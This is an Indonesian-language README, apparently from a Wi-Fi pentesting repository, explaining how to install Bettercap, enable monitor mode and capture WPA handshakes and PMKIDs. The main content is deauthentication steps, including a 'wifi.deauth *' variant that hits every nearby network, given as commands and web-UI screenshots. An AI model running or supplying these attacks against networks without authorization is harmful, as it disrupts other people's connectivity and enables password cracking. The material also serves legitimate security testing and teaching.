# Bettercap

![bettercap logo](https://github.com/fixploit03/Pentest-WiFi/blob/main/tools/bettercap/img/bettercap.jpg)

## Instalasi

Kali Linux:

1. Menggunakan package manager (`apt`):

   ```
   sudo apt-get update
   sudo apt-get install bettercap bettercap-dbgsym bettercap-caplets bettercap-ui
   bettercap -version
   ```

2. Menggunakan Go:

   Instalasi menggunakan Go harus sudah terinstal Go versi: `go1.24.7` atau lebih baru.
   
   ```
   sudo apt-get update
   sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
   go install github.com/bettercap/bettercap/v2@latest
   sudo mv ~/go/bin/bettercap /usr/local/bin/
   bettercap -version
   ```

Untuk informasi lebih lengkap, bisa dilihat di sini: [https://www.bettercap.org/project/installation/](https://www.bettercap.org/project/installation/)

## Setup Adapter Wi-Fi

1. Pasang adapter Wi-Fi ke laptop/PC.
2. Pada aplikasi VirtualBox klik tab `Devices` -> `USB` -> `Jenis/merek`.
3. Pastikan checkbox nya sudah tercentang.
4. Buka terminal.
5. Ketikkan `iwconfig`, pastikan nama interface `wlan0` muncul.
6. Kalau sudah muncul, aktifkan mode monitor menggunakan:

   ```
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
7. Cek kembali menggunakan `iwconfig` apakah mode interfacenya sudah berubah menjadi mode `Monitor`.
8. Cek packet injection menggunakan:

   ```
   sudo aireplay-ng --test wlan0
   ```
   
## Penggunaan

### 1. Mode Interaktif

Mode interaktif adalah mode di Bettercap di mana Anda menggunakan sesi interaktif dan memasukkan perintah secara manual satu per satu.

```
sudo bettercap
```

> Jika muncul error `No active interfaces found.`, gunakan opsi `-iface [interface]`.

#### Capture Handshake

Single target:

```
set wifi.handshakes.file [output_file]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth [bssid]
```

Semua target:

```
set wifi.handshakes.file [output_dir]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth *
```

#### Capture PMKID

Single target:

```
set wifi.handshakes.file [output_file]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

Semua target:

```
set wifi.handshakes.file [output_dir]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

### 2. Opsi Caplet

Caplet adalah sekumpulan perintah Bettercap yang disimpan dalam file berekstensi `.cap`. Fungsinya untuk mengotomatisasi eksekusi perintah-perintah di Bettercap, sehingga tidak perlu mengetik perintah satu per satu secara manual.

```
sudo bettercap -caplet [file_caplet]
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

Contoh file capletnya ada di sini: [https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap)

### 3. Mode Web UI

Mode Web UI adalah mode di Bettercap yang menyediakan antarmuka web, sehingga kita bisa menggunakan Bettercap melalui browser.

```
sudo bettercap -eval "ui on"
```

1. Arahkan kursor ke link di bagian `web ui starting on`, yaitu `http://127.0.0.1:80`, kemudian klik kanan dan pilih `Open Link`.

   ![img 1](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%201.png)
2. Masukkan kredensial login:
   - Usermame: `user`
   - Password: `pass`

   ![img 2](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%202.png)
3. Klik ikon Wi-Fi:

   ![img 3](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%203.png)
4. Pilih interface yang ingin digunakan dengan klik menu dropdown:


   ![img 4](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%204.png)
5. Mulai scanning Wi-Fi dengan klik ikon play:

   ![img 5](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%205.png)
6. Di gambar ini ada beberapa bagian, yaitu:

   ![img 6](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%206.png)

   - `RSSI`: Kekuatan sinyal dari Access Point (AP) dalam satuan [dBm](https://en.wikipedia.org/wiki/DBm).
   - `ESSID`: Nama Wi-Fi.
   - `BSSID`: Alamat MAC unik dari AP.
   - `Vendor`: Produsen AP berdasarkan BSSID.
   - `Encryption`: Jenis enkripsi yang dipakai oleh Wi-Fi.
   - `Ch`: Channel yang dipakai oleh AP.
   - `Clients`: Jumlah klien yang terhubung ke AP.
   - `Sent`: Jumlah paket data yang dikirim dari klien ke AP.
   - `Recvd`: Jumlah paket data yang diterima dari AP oleh klien.
   - `Seent`: Jumlah paket yang terdeteksi dari klien atau AP selama proses pemantauan.
8. Pilih BSSID target yang ingin diserang, lalu klik menu dropdown:

   ![img 7](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%207.png)
9. Tersedia dua jenis serangan yang dapat dilakukan:
   - Capture Handshake
   - Capture PMKID
  
   ![img 8](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%208.png)

   Jika ingin Capture Handshake, klik `Deauthenticate Client`. Jika ingin Capture PMKID, klik `Associate`. Dalam contoh ini, kita akan pilih `Capture Handshake`.
   
   > Catatan:
   >
   > - Capture Handshake: Harus ada 1 klien yang aktif.
   > - Capture PMKID: Tidak semua router mendukung PMKID.
10. Setelah klik `Deauthenticate Client`, tunggu hingga handshake berhasil di-capture. Handshake dianggap berhasil jika muncul ikon `kunci merah` di bagian `Encryption` dan muncul notifikasi `Captured handshake for station...`:

    ![img 9](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%209.png)
    
11. Klik ikon Events:

    ![img 10](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%2010.png)
12. Klik salah satu dari 3 `Type` berwarna merah di bagian pesan `Captured handshake for...`:

    ![img 11](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%2011.png)
13. Dari gambar ini, terlihat bahwa file handshake disimpan di direktori `/root` dengan nama file `bettercap-wifi-handshakes.pcap`.

    ![img 12](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/tools/bettercap/img/ui%2012.png)
